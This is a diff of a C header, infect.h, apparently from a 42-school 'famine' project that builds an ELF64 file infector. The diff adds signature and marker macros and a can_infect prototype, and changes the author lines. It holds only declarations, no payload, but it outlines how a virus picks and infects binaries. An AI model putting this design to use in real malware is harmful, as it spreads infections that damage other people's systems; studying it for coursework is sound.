@@ -3,10 +3,10 @@
 /*                                                        :::      ::::::::   */
 /*   infect.h                                           :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
-/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
+/*   By: jfortin <jfortin@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 04:27:47 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/07 09:27:54 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/15 17:17:38 by ichkamo          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -19,6 +19,15 @@
 # include <sys/types.h>
 # include "famine.h"
 # include "accessors.h"
+
+/*
+** inline markers + hardcoded signature
+** see famine.s
+*/
+
+# define CALL_INSTR_SIZE	5 /* sizeof "call mark_below" -> e8 2000 0000 */
+# define SIGNATURE_LEN		64
+# define SIGNATURE_CKSUM	0x1526
 
 # define SHIFT_ALIGNMENT	4096
 # define ALIGN(x, n)		(((x) + (n)) & ~((n) - 1))
@@ -58,6 +67,7 @@ bool	foreach_shdr(const struct safe_pointer info, f_iter_callback callback, void
 bool		infect_if_candidate(const char *file);
 bool		elf64_packer(const struct famine food, size_t original_file_size);
 bool		find_entry(struct entry *original_entry, struct safe_pointer info);
+bool		can_infect(const struct entry *original_entry, const struct safe_pointer info);
 bool		setup_payload(const struct entry *original_entry, const struct safe_pointer info);
 bool		adjust_references(const struct safe_pointer info, size_t shift_amount, const struct entry *original_entry);
 bool		copy_to_clone(const struct famine food, size_t end_last_sect, \
